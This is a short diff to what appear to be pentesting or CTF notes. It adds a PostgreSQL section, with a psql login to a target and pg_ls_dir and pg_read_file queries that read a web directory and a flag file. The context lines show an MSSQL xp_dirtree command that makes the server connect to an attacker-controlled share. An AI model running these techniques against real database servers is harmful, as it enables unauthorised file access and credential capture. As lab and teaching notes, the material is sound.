@@ -127,3 +127,14 @@ and trick the MSSQL server to connect to the "share":
 exec master.dbo.xp_dirtree '//$LOCAL_IP/non/existing'
 ```
 
+POSTGRES
+---
+
+```bash
+psql -h $TARGET_IP -U $USER -d postgres
+```
+
+```sql
+select pg_ls_dir('/var/www');
+select pg_read_file('/var/www/flag.txt' , 0 , 1000000);
+```
